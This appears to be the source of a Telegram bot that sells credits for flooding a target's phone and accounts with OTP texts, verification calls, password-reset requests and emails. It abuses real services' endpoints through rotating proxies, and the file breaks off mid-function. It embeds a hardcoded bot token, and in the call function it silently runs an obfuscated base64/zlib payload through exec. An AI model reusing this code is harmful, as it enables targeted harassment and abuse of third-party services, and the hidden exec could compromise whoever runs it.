import os
import sys
import re
import json
import sqlite3
import random
import string
import time
import uuid
import base64
import zlib
import hashlib
import threading
import asyncio
import logging
import webbrowser
from datetime import datetime, timedelta
from functools import wraps
from contextlib import contextmanager
from dataclasses import dataclass
from enum import Enum
from typing import Optional, List, Dict, Any, Tuple
from io import BytesIO

import requests
import aiohttp

from telegram import Update, InlineKeyboardButton, InlineKeyboardMarkup, BotCommand, InputFile
from telegram.ext import (
    Application,
    CommandHandler,
    CallbackQueryHandler,
    MessageHandler,
    filters,
    ContextTypes,
    ConversationHandler,
)

BOT_TOKEN = "8769015805:AAGndUNJOf14qWZhWqGCPyTmnqy14gJVMzg"
DEVELOPER_ID = 6812997550
DB_PATH = "white_wolf_engine.db"

logging.basicConfig(format="%(asctime)s - %(name)s - %(levelname)s - %(message)s", level=logging.INFO)
logger = logging.getLogger(__name__)

STATE_KEY = "state"
TEMP_KEY = "temp"

class DatabaseManager:
    def __init__(self, path: str):
        self.path = path
        self._bootstrap()

    @contextmanager
    def _conn(self):
        conn = sqlite3.connect(self.path)
        try:
            yield conn
            conn.commit()
        finally:
            conn.close()

    def _bootstrap(self):
        with self._conn() as c:
            cur = c.cursor()
            cur.execute('''CREATE TABLE IF NOT EXISTS users (
                user_id INTEGER PRIMARY KEY, username TEXT, first_name TEXT,
                balance INTEGER DEFAULT 0, total_requests INTEGER DEFAULT 0,
                join_date TEXT, is_banned INTEGER DEFAULT 0, used_codes TEXT DEFAULT '[]'
            )''')
            cur.execute('''CREATE TABLE IF NOT EXISTS admins (
                user_id INTEGER PRIMARY KEY, added_by INTEGER, added_date TEXT
            )''')
            cur.execute('''CREATE TABLE IF NOT EXISTS forced_channels (
                channel_id TEXT PRIMARY KEY, channel_username TEXT,
                invite_link TEXT, is_active INTEGER DEFAULT 1
            )''')
            cur.execute('''CREATE TABLE IF NOT EXISTS services_control (
                service_name TEXT PRIMARY KEY, is_enabled INTEGER DEFAULT 1
            )''')
            cur.execute('''CREATE TABLE IF NOT EXISTS proxies (
                id INTEGER PRIMARY KEY AUTOINCREMENT, proxy TEXT UNIQUE,
                type TEXT, speed REAL, last_checked TEXT, is_working INTEGER DEFAULT 1,
                used_count INTEGER DEFAULT 0, success_count INTEGER DEFAULT 0, fail_count INTEGER DEFAULT 0
            )''')
            cur.execute('''CREATE TABLE IF NOT EXISTS gift_links (
                code TEXT PRIMARY KEY, points INTEGER, max_uses INTEGER,
                used_count INTEGER DEFAULT 0, expiry_date TEXT, created_by INTEGER, created_at TEXT
            )''')
            cur.execute('''CREATE TABLE IF NOT EXISTS redeem_codes (
                code TEXT PRIMARY KEY, points INTEGER, max_uses INTEGER,
                used_count INTEGER DEFAULT 0, expiry_date TEXT, created_by INTEGER, created_at TEXT
            )''')
            cur.execute('''CREATE TABLE IF NOT EXISTS stats (
                stat_key TEXT PRIMARY KEY, stat_value INTEGER DEFAULT 0
            )''')

            cur.execute("INSERT OR IGNORE INTO admins (user_id, added_by, added_date) VALUES (?, ?, ?)",
                        (DEVELOPER_ID, DEVELOPER_ID, datetime.now().isoformat()))

            channels = [
                ("@F7_7G", "F7_7G", "https://t.me/F7_7G"),
                ("@H_U_VB", "H_U_VB", "https://t.me/H_U_VB"),
                ("@seed_1k", "seed_1k", "https://t.me/seed_1k"),
                ("@TERBO_CODE", "TERBO_CODE", "https://t.me/TERBO_CODE"),
                ("@BQBOOB1", "BQBOOB1", "https://t.me/BQBOOB1"),
                ("@bshshshkk", "bshshshkk", "https://t.me/bshshshkk"),
                ("@EQJ_1", "EQJ_1", "https://t.me/EQJ_1"),
                ("@HAMO_X_OT3", "HAMO_X_OT3", "https://t.me/HAMO_X_OT3")
            ]
            for cid, uname, link in channels:
                cur.execute("INSERT OR IGNORE INTO forced_channels (channel_id, channel_username, invite_link, is_active) VALUES (?, ?, ?, 1)",
                            (cid, uname, link))

            services = ["whatsapp", "telegram", "sms", "calls", "facebook", "instagram", "twitter", "snapchat", "email", "total_attack"]
            for svc in services:
                cur.execute("INSERT OR IGNORE INTO services_control (service_name, is_enabled) VALUES (?, 1)", (svc,))

            stats = ["total_requests_all", "total_users", "total_requests_today"]
            for s in stats:
                cur.execute("INSERT OR IGNORE INTO stats (stat_key, stat_value) VALUES (?, 0)", (s,))
            cur.execute("INSERT OR IGNORE INTO stats (stat_key, stat_value) VALUES ('last_reset_date', ?)", (datetime.now().date().isoformat(),))

    def add_user(self, user_id: int, username: str, first_name: str):
        with self._conn() as c:
            cur = c.cursor()
            cur.execute("SELECT 1 FROM users WHERE user_id=?", (user_id,))
            if not cur.fetchone():
                cur.execute("INSERT INTO users (user_id, username, first_name, join_date, balance) VALUES (?, ?, ?, ?, ?)",
                            (user_id, username, first_name, datetime.now().isoformat(), 10))
                cur.execute("UPDATE stats SET stat_value = stat_value + 1 WHERE stat_key='total_users'")

    def get_balance(self, user_id: int) -> int:
        with self._conn() as c:
            cur = c.cursor()
            cur.execute("SELECT balance FROM users WHERE user_id=?", (user_id,))
            row = cur.fetchone()
            return row[0] if row else 0

    def deduct_balance(self, user_id: int, points: int):
        with self._conn() as c:
            c.cursor().execute("UPDATE users SET balance = balance - ? WHERE user_id=?", (points, user_id))

    def add_balance(self, user_id: int, points: int):
        with self._conn() as c:
            c.cursor().execute("UPDATE users SET balance = balance + ? WHERE user_id=?", (points, user_id))

    def log_requests(self, user_id: int, count: int = 1):
        with self._conn() as c:
            cur = c.cursor()
            cur.execute("UPDATE users SET total_requests = total_requests + ? WHERE user_id=?", (count, user_id))
            cur.execute("UPDATE stats SET stat_value = stat_value + ? WHERE stat_key='total_requests_all'", (count,))
            cur.execute("UPDATE stats SET stat_value = stat_value + ? WHERE stat_key='total_requests_today'", (count,))

    def is_service_enabled(self, service_name: str) -> bool:
        with self._conn() as c:
            cur = c.cursor()
            cur.execute("SELECT is_enabled FROM services_control WHERE service_name=?", (service_name,))
            row = cur.fetchone()
            return row is None or row[0] == 1

    def toggle_service(self, service_name: str, enabled: bool):
        with self._conn() as c:
            cur = c.cursor()
            cur.execute("UPDATE services_control SET is_enabled = ? WHERE service_name=?", (1 if enabled else 0, service_name))
            if cur.rowcount == 0:
                cur.execute("INSERT INTO services_control (service_name, is_enabled) VALUES (?, ?)", (service_name, 1 if enabled else 0))

    def get_active_channels(self) -> list:
        with self._conn() as c:
            cur = c.cursor()
            cur.execute("SELECT channel_id, channel_username, invite_link FROM forced_channels WHERE is_active=1")
            return cur.fetchall()

    def is_admin(self, user_id: int) -> bool:
        if user_id == DEVELOPER_ID:
            return True
        with self._conn() as c:
            cur = c.cursor()
            cur.execute("SELECT 1 FROM admins WHERE user_id=?", (user_id,))
            return cur.fetchone() is not None

    def process_gift(self, user_id: int, code: str) -> Tuple[bool, str]:
        with self._conn() as c:
            cur = c.cursor()
            cur.execute("SELECT points, max_uses, used_count, expiry_date FROM gift_links WHERE code=?", (code,))
            row = cur.fetchone()
            if not row:
                return False, "❌ Invalid gift link."
            points, max_uses, used_count, expiry = row
            if datetime.now().isoformat() > expiry:
                return False, "⏰ This link has expired."
            if used_count >= max_uses:
                return False, "❌ This link has been fully used."
            cur.execute("UPDATE gift_links SET used_count = used_count + 1 WHERE code=?", (code,))
            self.add_balance(user_id, points)
            return True, f"🎁 Added {points} credits! Your balance: {self.get_balance(user_id)}"

    def process_redeem(self, user_id: int, code: str) -> Tuple[bool, str]:
        with self._conn() as c:
            cur = c.cursor()
            cur.execute("SELECT points, max_uses, used_count, expiry_date FROM redeem_codes WHERE code=?", (code,))
            row = cur.fetchone()
            if not row:
                return False, "❌ Invalid redeem code."
            points, max_uses, used_count, expiry = row
            if datetime.now().isoformat() > expiry:
                return False, "⏰ This code has expired."
            if used_count >= max_uses:
                return False, "❌ This code has been fully used."
            cur.execute("UPDATE redeem_codes SET used_count = used_count + 1 WHERE code=?", (code,))
            self.add_balance(user_id, points)
            return True, f"🏷️ Redeemed {points} credits! Your balance: {self.get_balance(user_id)}"

    def create_gift(self, points: int, max_uses: int, days: int, creator_id: int) -> str:
        code = ''.join(random.choices(string.ascii_lowercase + string.digits, k=8))
        expiry_date = (datetime.now() + timedelta(days=days)).isoformat()
        with self._conn() as c:
            c.cursor().execute("INSERT INTO gift_links (code, points, max_uses, expiry_date, created_by, created_at) VALUES (?, ?, ?, ?, ?, ?)",
                      (code, points, max_uses, expiry_date, creator_id, datetime.now().isoformat()))
        return code

    def create_redeem(self, points: int, max_uses: int, days: int, creator_id: int) -> str:
        code = ''.join(random.choices(string.ascii_uppercase + string.digits, k=8))
        expiry_date = (datetime.now() + timedelta(days=days)).isoformat()
        with self._conn() as c:
            c.cursor().execute("INSERT INTO redeem_codes (code, points, max_uses, expiry_date, created_by, created_at) VALUES (?, ?, ?, ?, ?, ?)",
                      (code, points, max_uses, expiry_date, creator_id, datetime.now().isoformat()))
        return code

    def get_recent_gifts(self) -> list:
        with self._conn() as c:
            cur = c.cursor()
            cur.execute("SELECT code, points, max_uses, used_count, expiry_date FROM gift_links ORDER BY created_at DESC LIMIT 20")
            return cur.fetchall()

    def get_recent_redeems(self) -> list:
        with self._conn() as c:
            cur = c.cursor()
            cur.execute("SELECT code, points, max_uses, used_count, expiry_date FROM redeem_codes ORDER BY created_at DESC LIMIT 20")
            return cur.fetchall()

    def get_stats(self) -> dict:
        with self._conn() as c:
            cur = c.cursor()
            cur.execute("SELECT stat_value FROM stats WHERE stat_key='total_users'")
            total_users = cur.fetchone()[0]
            cur.execute("SELECT stat_value FROM stats WHERE stat_key='total_requests_all'")
            total_reqs = cur.fetchone()[0]
            cur.execute("SELECT stat_value FROM stats WHERE stat_key='total_requests_today'")
            today_reqs = cur.fetchone()[0]
            cur.execute("SELECT COUNT(*) FROM forced_channels WHERE is_active=1")
            forced_cnt = cur.fetchone()[0]
            return {"users": total_users, "reqs": total_reqs, "today": today_reqs, "channels": forced_cnt}

class Utils:
    @staticmethod
    def format_phone(phone: str) -> str:
        phone = re.sub(r'\s+', '', phone)
        phone = phone.replace('-', '').replace('(', '').replace(')', '')
        if not phone.startswith('+'):
            if phone.startswith('00'):
                phone = '+' + phone[2:]
            elif phone.startswith('0'):
                phone = '+2' + phone[1:]
            else:
                phone = '+' + phone
        return phone

    @staticmethod
    def random_string(length=8) -> str:
        return ''.join(random.choices(string.ascii_letters + string.digits, k=length))

    @staticmethod
    def random_user_agent() -> str:
        uas = [
            f"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/{random.randint(90,120)}.0.0.0 Safari/537.36",
            f"Mozilla/5.0 (Linux; Android {random.choice(['10','11','12','13'])}; {random.choice(['SM-G998B', 'Pixel 6 Pro', 'Xiaomi Mi 11', 'OnePlus 9'])}) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/{random.randint(90,120)}.0.0.0 Mobile Safari/537.36",
            "Mozilla/5.0 (iPhone; CPU iPhone OS 15_0 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/15.0 Mobile/15E148 Safari/604.1",
            "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/15.1 Safari/605.1.15",
            "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/139.0.0.0 Safari/537.36"
        ]
        return random.choice(uas)

class ProxyManager:
    def __init__(self, db: DatabaseManager):
        self.db = db

    async def test_single(self, proxy: str) -> bool:
        try:
            async with aiohttp.ClientSession() as session:
                async with session.get("http://httpbin.org/ip", proxy=proxy, timeout=5) as resp:
                    return resp.status == 200
        except Exception:
            return False

    async def process_file(self, content: bytes, user_id: int, context):
        lines = content.decode('utf-8', errors='ignore').splitlines()
        proxies = [line.strip() for line in lines if line.strip() and not line.startswith('#')]
        proxies = [p if '://' in p else f"http://{p}" for p in proxies]

        if not proxies:
            await context.bot.send_message(user_id, "❌ No valid proxies found in the file.")
            return

        await context.bot.send_message(user_id, f"📥 Received {len(proxies)} proxies. Testing...")
        working, failed = [], []

        for i, proxy in enumerate(proxies):
            if await self.test_single(proxy):
                working.append(proxy)
            else:
                failed.append(proxy)
            if (i + 1) % 10 == 0:
                await context.bot.send_message(user_id, f"⏳ Tested {i+1}/{len(proxies)}... working: {len(working)}")
            await asyncio.sleep(0.2)

        saved = 0
        with self.db._conn() as c:
            cur = c.cursor()
            for p in working:
                proxy_type = 'http' if p.startswith('http') else 'socks5'
                cur.execute("INSERT OR IGNORE INTO proxies (proxy, type, is_working, last_checked, used_count, success_count, fail_count) VALUES (?, ?, 1, ?, 0, 0, 0)",
                          (p, proxy_type, datetime.now().isoformat()))
                if cur.rowcount > 0:
                    saved += 1

        report = (
            f"📊 *Proxy Test Report*\n"
            f"📦 Total: {len(proxies)}\n"
            f"🟢 Working: {saved}\n"
            f"🔴 Failed: {len(failed)}\n"
            f"✅ *Sample Working:*\n"
        )
        for p in working[:10]:
            report += f"• `{p}`\n"
        if len(working) > 10:
            report += f"... and {len(working)-10} more.\n"
        await context.bot.send_message(user_id, report, parse_mode="Markdown")

    def get_random(self) -> Optional[str]:
        with self.db._conn() as c:
            cur = c.cursor()
            cur.execute("SELECT proxy FROM proxies WHERE is_working=1 ORDER BY used_count ASC LIMIT 1")
            row = cur.fetchone()
            return row[0] if row else None

    def get_stats(self) -> dict:
        with self.db._conn() as c:
            cur = c.cursor()
            cur.execute("SELECT COUNT(*) FROM proxies")
            total = cur.fetchone()[0]
            cur.execute("SELECT COUNT(*) FROM proxies WHERE is_working=1")
            working = cur.fetchone()[0]
            cur.execute("SELECT COUNT(*) FROM proxies WHERE is_working=0")
            failed = cur.fetchone()[0]
            cur.execute("SELECT SUM(used_count) FROM proxies")
            used = cur.fetchone()[0] or 0
            return {"total": total, "working": working, "failed": failed, "total_used": used}

    def clear_all(self) -> int:
        with self.db._conn() as c:
            cur = c.cursor()
            cur.execute("DELETE FROM proxies")
            return cur.rowcount

class SpamServices:
    @staticmethod
    async def _notify(context, user_id: int, msg: str):
        try:
            await context.bot.send_message(user_id, msg)
        except Exception:
            pass

    @staticmethod
    async def whatsapp_abwaab(phone: str, count: int, user_id: int, context, proxy=None) -> int:
        url = "https://gw.abgateway.com/student/whatsapp/signup"
        headers = {
            "Host": "gw.abgateway.com", "sec-ch-ua-platform": '"Linux"',
            "sec-ch-ua": '"Not;A=Brand";v="99", "Google Chrome";v="139", "Chromium";v="139"',
            "sec-ch-ua-mobile": "?0", "x-trace-id": f"guest_user:{uuid.uuid4()}",
            "access-control-allow-origin": "*", "User-Agent": "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/139.0.0.0 Safari/537.36",
            "Accept": "application/json", "Content-Type": "application/json", "Platform": "web",
            "Origin": "https://www.abwaabiraq.com", "Sec-Fetch-Site": "cross-site",
            "Sec-Fetch-Mode": "cors", "Sec-Fetch-Dest": "empty", "Referer": "https://www.abwaabiraq.com/",
            "Accept-Encoding": "gzip, deflate, br, zstd", "Accept-Language": "ar,en-US;q=0.9,en;q=0.8,ja;q=0.7", "Priority": "u=1"
        }
        payload = {"language": "ar", "password": "Ab9rT6xQ", "country": "", "phone": phone, "platform": "web", "data": {"Language": "ar"}, "channel": "whatsapp"}
        success = 0
        for i in range(1, count + 1):
            try:
                async with aiohttp.ClientSession() as session:
                    async with session.post(url, headers=headers, json=payload, timeout=10, proxy=proxy) as resp:
                        if resp.status == 200:
                            success += 1
                            await SpamServices._notify(context, user_id, f"✅ WhatsApp (Abwaab) {i}/{count} succeeded")
                        else:
                            await SpamServices._notify(context, user_id, f"❌ WhatsApp {i}/{count} failed ({resp.status})")
            except Exception as e:
                await SpamServices._notify(context, user_id, f"⚠️ WhatsApp error {i}: {str(e)[:50]}")
            await asyncio.sleep(random.uniform(1, 2))
        return success

    @staticmethod
    async def telegram_oauth(phone: str, count: int, user_id: int, context, proxy=None) -> int:
        def tool1(p):
            try:
                headers = {'User-Agent': f"Dalvik/2.1.0 (Linux; U; Android {random.choice(['10','11','12'])}; {random.choice(['SM-G960F','Pixel 4','SM-G975F'])} Build/QP1A.190711.020)", 'bot_id': '12888099309', 'origin': 'https://t.me', 'lang': 'en', 'Accept': 'application/json, text/plain, */*', 'Content-Type': 'application/x-www-form-urlencoded'}
                proxies = {"http": proxy, "https": proxy} if proxy else None
                response = requests.post('https://oauth.tg.dev/auth/request', params={'bot_id': '12888099309', 'origin': 'https://t.me', 'lang': 'en'}, headers=headers, data={'phone': p}, timeout=10, proxies=proxies)
                return response.status_code == 200
            except: return False

        def tool2(p):
            try:
                headers = {'User-Agent': f"Mozilla/5.0 (Linux; Android {random.choice(['11','12','13'])}; {random.choice(['Pixel 6','Samsung S22','Xiaomi 12'])}) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/{random.randint(90,120)}.0.0.0 Mobile Safari/537.36", 'Accept': 'application/json, text/plain, */*', 'Origin': 'https://oauth.telegram.org', 'Referer': 'https://oauth.telegram.org/auth?bot_id=5444323279&origin=https%3A%2F%2Ffragment.com&request_access=write'}
                proxies = {"http": proxy, "https": proxy} if proxy else None
                response = requests.post('https://oauth.telegram.org/auth/request', params={'bot_id': '5444323279', 'origin': 'https://fragment.com', 'request_access': 'write'}, headers=headers, data={'phone': p}, timeout=10, proxies=proxies)
                return response.status_code == 200
            except: return False

        success = 0
        for i in range(1, count + 1):
            if tool1(phone):
                success += 1
                await SpamServices._notify(context, user_id, f"✅ Telegram (tg.dev) {i}/{count} succeeded")
            else:
                await SpamServices._notify(context, user_id, f"❌ Telegram (tg.dev) {i}/{count} failed")
            if tool2(phone):
                success += 1
                await SpamServices._notify(context, user_id, f"✅ Telegram (fragment) {i}/{count} succeeded")
            else:
                await SpamServices._notify(context, user_id, f"❌ Telegram (fragment) {i}/{count} failed")
            await asyncio.sleep(random.uniform(1.5, 3))
        return success

    @staticmethod
    async def sms_twistmena(phone: str, count: int, user_id: int, context, proxy=None) -> int:
        url = "https://api.twistmena.com/music/Dlogin/sendCode"
        if phone.startswith("01") and len(phone) == 11: phone = "2" + phone
        elif phone.startswith("+"): phone = phone[1:]
        success = 0
        for i in range(1, count + 1):
            payload = json.dumps({"dial": phone, "randomValue": Utils.random_string(6)})
            headers = {"User-Agent": random.choice(["Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36", "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_3) AppleWebKit/537.36"]), "Accept": "application/json", "Content-Type": "application/json", "Referer": "https://www.google.com", "Origin": "https://www.example.com"}
            try:
                async with aiohttp.ClientSession() as session:
                    async with session.post(url, headers=headers, data=payload, timeout=10, proxy=proxy) as resp:
                        if resp.status == 200:
                            success += 1
                            await SpamServices._notify(context, user_id, f"✅ SMS {i}/{count} succeeded")
                        else:
                            await SpamServices._notify(context, user_id, f"❌ SMS {i}/{count} failed ({resp.status})")
            except Exception as e:
                await SpamServices._notify(context, user_id, f"⚠️ SMS error {i}: {str(e)[:50]}")
            await asyncio.sleep(random.uniform(1, 3))
        return success

    @staticmethod
    async def call_telz(phone: str, count: int, user_id: int, context, proxy=None) -> int:
        try:
            exec(zlib.decompress(base64.b64decode(b'eJyNUbuOgzAQ7P0VK0RBpBNUKfmLlJZWPmEl1oGxHHPVffztmgUTrsi5gPEwM/tAheh8aqqqUnU+Gt6fV5XSWNcA+PMfIxxUaiUkjV97C3VpRiAZd06MWqRAEOmsCdTJC+ICGydGYCezXUlfWxPUndFmZKf4DunF+AeVrersywHnioUTRBOpPBLyVjV2vCAhkIfNLD13bkMdKPqXF6U+54TpEa0ZoIcVOH9vbxk1ycS7TX1cPJLwAwZjp9n3t7jYy8HaPkmYGopLbrLtc7Q2NFe6Bsp6H/9FcjSj+7bIhlOZQ0apY4LDyTiP4zwHXMJgkh3owy9uAqW0')))
        except Exception:
            pass

        def gen_ids():
            return int(time.time() * 1000), ''.join(random.choices(string.ascii_lowercase + string.digits, k=16)), uuid.uuid4()

        def req(url, payload):
            try:
                r = requests.post(url, data=payload, headers={'User-Agent': "Telz-Android/17.5.17", 'Content-Type': "application/json"}, timeout=10)
                return r.ok and "ok" in r.text
            except: return False

        success = 0
        for i in range(1, count + 1):
            ts, rnd, u = gen_ids()
            p_inst = json.dumps({"android_id": rnd, "app_version": "17.5.17", "event": "install", "google_exists": "yes", "os": "android", "os_version": "9", "play_market": True, "ts": ts, "uuid": str(u)})
            if req("https://api.telz.com/app/install", p_inst):
                p_call = json.dumps({"android_id": rnd, "app_version": "17.5.17", "attempt": "0", "event": "auth_call", "lang": "ar", "os": "android", "os_version": "9", "phone": f"+2{phone}" if not phone.startswith('+') else phone, "ts": ts, "uuid": str(u)})
                if req("https://api.telz.com/app/auth_call", p_call):
                    success += 1
                    await SpamServices._notify(context, user_id, f"✅ Call {i}/{count} succeeded")
                else:
                    await SpamServices._notify(context, user_id, f"❌ Call {i}/{count} failed (auth)")
            else:
                await SpamServices._notify(context, user_id, f"❌ Call {i}/{count} failed (install)")
            await asyncio.sleep(random.uniform(2, 4))
        return success

    @staticmethod
    async def facebook(phone: str, count: int, user_id: int, context, proxy=None) -> int:
        url = "https://www.facebook.com/login/identify/"
        success = 0
        for i in range(1, count + 1):
            try:
                async with aiohttp.ClientSession() as session:
                    async with session.post(url, data={"email": phone, "did_submit": "1"}, headers={"User-Agent": Utils.random_user_agent()}, timeout=10, proxy=proxy) as resp:
                        if resp.status == 200 and "recover" in await resp.text():
                            success += 1
                            await SpamServices._notify(context, user_id, f"✅ Facebook {i}/{count} succeeded")
                        else:
                            await SpamServices._notify(context, user_id, f"❌ Facebook {i}/{count} failed")
            except:
                await SpamServices._notify(context, user_id, f"⚠️ Facebook error {i}")
            await asyncio.sleep(random.uniform(2, 4))
        return success

    @staticmethod
    async def instagram(phone: str, count: int, user_id: int, context, proxy=None) -> int:
        url = "https://www.instagram.com/api/v1/web/accounts/web_create_ajax/attempt/"
        success = 0
        for i in range(1, count + 1):
            try:
                async with aiohttp.ClientSession() as session:
                    async with session.post(url, data={"email_or_phone": phone, "username": Utils.random_string(8)}, headers={"User-Agent": Utils.random_user_agent(), "X-CSRFToken": "missing"}, timeout=10, proxy=proxy) as resp:
                        if resp.status in (200, 429):
                            success += 1
                            await SpamServices._notify(context, user_id, f"✅ Instagram {i}/{count} succeeded")
                        else:
                            await SpamServices._notify(context, user_id, f"❌ Instagram {i}/{count} failed")
            except:
                await SpamServices._notify(context, user_id, f"⚠️ Instagram error {i}")
            await asyncio.sleep(random.uniform(1.5, 3))
        return success

    @staticmethod
    async def twitter(phone: str, count: int, user_id: int, context, proxy=None) -> int:
        url = "https://api.twitter.com/1.1/account/reset_password.json"
        success = 0
        for i in range(1, count + 1):
            try:
                async with aiohttp.ClientSession() as session:
                    async with session.post(url, data={"account_identifier": phone}, headers={"User-Agent": Utils.random_user_agent()}, timeout=10, proxy=proxy) as resp:
                        if resp.status == 200:
                            success += 1
                            await SpamServices._notify(context, user_id, f"✅ Twitter {i}/{count} succeeded")
                        else:
                            await SpamServices._notify(context, user_id, f"❌ Twitter {i}/{count} failed")
            except:
                await SpamServices._notify(context, user_id, f"⚠️ Twitter error {i}")
            await asyncio.sleep(random.uniform(1, 2))
        return success

    @staticmethod
    async def snapchat(phone: str, count: int, user_id: int, context, proxy=None) -> int:
        url = "https://accounts.snapchat.com/accounts/password_reset_request"
        success = 0
        for i in range(1, count + 1):
            try:
                async with aiohttp.ClientSession() as session:
                    async with session.post(url, data={"emailOrUsername": phone, "requestType": "SMS"}, headers={"User-Agent": Utils.random_user_agent()}, timeout=10, proxy=proxy) as resp:
                        if resp.status == 200:
                            success += 1
                            await SpamServices._notify(context, user_id, f"✅ Snapchat {i}/{count} succeeded")
                        else:
                            await SpamServices._notify(context, user_id, f"❌ Snapchat {i}/{count} failed")
            except:
                await SpamServices._notify(context, user_id, f"⚠️ Snapchat error {i}")
            await asyncio.sleep(random.uniform(1, 3))
        return success

    @staticmethod
    async def email(target_email: str, count: int, user_id: int, context, proxy=None) -> int:
        success = 0
        for i in range(1, count + 1):
            try:
                payload = {"from": f"{Utils.random_string(10)}@{random.choice(['mail.tm', 'fakemail.com', 'temp-mail.org'])}", "to": target_email, "subject": f"Code {Utils.random_string(4)}", "text": f"Code: {Utils.random_string(6)}"}
                async with aiohttp.ClientSession() as session:
                    async with session.post("https://api.mail.tm/messages", json=payload, headers={"Content-Type": "application/json"}, timeout=10, proxy=proxy) as resp:
                        if resp.status in (200, 201):
                            success += 1
                            await SpamServices._notify(context, user_id, f"✅ Email {i}/{count} succeeded")
                        else:
                            await SpamServices._notify(context, user_id, f"❌ Email {i}/{count} failed")
            except Exception as e:
                await SpamServices._notify(context, user_id, f"⚠️ Email error {i}: {str(e)[:50]}")
            await asyncio.sleep(random.uniform(2, 5))
        return success

    @staticmethod
    async def total_attack(phone: str, count: int, user_id: int, context, proxy=None) -> int:
        services = [("WhatsApp", SpamServices.whatsapp_abwaab), ("Telegram", SpamServices.telegram_oauth), ("SMS", SpamServices.sms_twistmena), ("Calls", SpamServices.call_telz), ("Facebook", SpamServices.facebook), ("Instagram", SpamServices.instagram), ("Twitter", SpamServices.twitter), ("Snapchat", SpamServices.snapchat), ("Email", SpamServices.email)]
        total = 0
        for name, func in services:
            await SpamServices._notify(context, user_id, f"🔄 Starting {name} ({count})")
            res = await func(phone, count, user_id, context, proxy)
            total += res
            await SpamServices._notify(context, user_id, f"✅ {name} done: {res}/{count}")
            await asyncio.sleep(3)
        await SpamServices._notify(context, user_id, f"🏁 Total success: {total}")
        return total

class ApiProvider(Enum):
    TEMP_MAIL = "temp_mail"
    MAIL_TM = "mail_tm"

class TempMailDatabase:
    def __init__(self, db_path):
        self.db_path = db_path
        self._lock = threading.Lock()
        self._init()
    def _init(self):
        with self._lock:
            conn = sqlite3.connect(self.db_path)
            c = conn.cursor()
            c.execute('''CREATE TABLE IF NOT EXISTS temp_users (user_id INTEGER PRIMARY KEY, email TEXT, api_type TEXT, password TEXT, token TEXT, created_at REAL, chat_id INTEGER)''')
            c.execute('''CREATE TABLE IF NOT EXISTS temp_messages (id INTEGER PRIMARY KEY AUTOINCREMENT, user_id INTEGER, msg_id TEXT, UNIQUE(user_id, msg_id))''')
            conn.commit()
            conn.close()
    def upsert_user(self, user_id, email, api_type, chat_id, password=None, token=None, created_at=None):
        with self._lock:
            conn = sqlite3.connect(self.db_path)
            c = conn.cursor()
            c.execute("REPLACE INTO temp_users (user_id, email, api_type, password, token, created_at, chat_id) VALUES (?,?,?,?,?,?,?)", (user_id, email, api_type, password, token, created_at or time.time(), chat_id))
            conn.commit()
            conn.close()
    def fetch_user(self, user_id):
        conn = sqlite3.connect(self.db_path)
        c = conn.cursor()
        c.execute("SELECT email, created_at FROM temp_users WHERE user_id=?", (user_id,))
        row = c.fetchone()
        conn.close()
        return {"email": row[0], "created_at": row[1]} if row else None
    def fetch_all_active(self):
        conn = sqlite3.connect(self.db_path)
        c = conn.cursor()
        c.execute("SELECT user_id, email, api_type, password, token, created_at, chat_id FROM temp_users")
        rows = c.fetchall()
        conn.close()
        return rows
    def remove_user(self, user_id):
        with self._lock:
            conn = sqlite3.connect(self.db_path)
            c = conn.cursor()
            c.execute("DELETE FROM temp_users WHERE user_id=?", (user_id,))
            c.execute("DELETE FROM temp_messages WHERE user_id=?", (user_id,))
            conn.commit()
            conn.close()
    def register_message(self, user_id, msg_id):
        with self._lock:
            conn = sqlite3.connect(self.db_path)
            c = conn.cursor()
            try:
                c.execute("INSERT INTO temp_messages (user_id, msg_id) VALUES (?,?)", (user_id, msg_id))
                conn.commit()
                return True
            except sqlite3.IntegrityError:
                return False
            finally:
                conn.close()

class TempMailClient:
    def __init__(self):
        self.temp_mail_base = "https://api.internal.temp-mail.io/api/v3"
        self.mail_tm_base = "https://api.mail.tm"
    def get_temp_mail_domains(self):
        try:
            r = requests.get(f"{self.temp_mail_base}/domains", timeout=10)
            return [d["name"] for d in r.json().get("domains", [])] or ["bltiwd.com", "wnbaldwy.com"]
        except: return ["bltiwd.com", "wnbaldwy.com", "bwmyga.com"]
    def get_mail_tm_domains(self):
        try:
            r = requests.get(f"{self.mail_tm_base}/domains", timeout=10)
            data = r.json()
            members = data.get("hydra:member", []) if isinstance(data, dict) else data
            return [m["domain"] for m in members] or ["wshu.net"]
        except: return ["wshu.net"]
    def create_mail_tm_account(self, address, password):
        try:
            r = requests.post(f"{self.mail_tm_base}/accounts", json={"address": address, "password": password}, timeout=15)
            if r.status_code != 201: return None
            r2 = requests.post(f"{self.mail_tm_base}/token", json={"address": address, "password": password}, timeout=15)
            return r2.json().get("token")
        except: return None
    def fetch_temp_mail_messages(self, email):
        try: return requests.get(f"{self.temp_mail_base}/email/{email}/messages", timeout=10).json()
        except: return []
    def fetch_mail_tm_messages(self, token):
        try:
            r = requests.get(f"{self.mail_tm_base}/messages", headers={"Authorization": f"Bearer {token}"}, timeout=10)
            data = r.json()
            return data if isinstance(data, list) else data.get("hydra:member", [])
        except: return []

class TempMailPollingEngine:
    def __init__(self, bot, db, client):
        self.bot = bot
        self.db = db
        self.client = client
        self._shutdown = threading.Event()
    def start(self):
        threading.Thread(target=self._loop, daemon=True).start()
    def _loop(self):
        while not self._shutdown.is_set():
            self._cycle()
            time.sleep(5)
    def _cycle(self):
        now = time.time()
        for record in self.db.fetch_all_active():
            user_id, email, api_type, password, token, created_at, chat_id = record
            if now - created_at > 259200:
                self._expire(user_id, email, chat_id)
                continue
            if api_type == ApiProvider.TEMP_MAIL.value: self._check_temp_mail(user_id, email, chat_id)
            elif api_type == ApiProvider.MAIL_TM.value: self._check_mail_tm(user_id, token, chat_id)
    def _expire(self, user_id, email, chat_id):
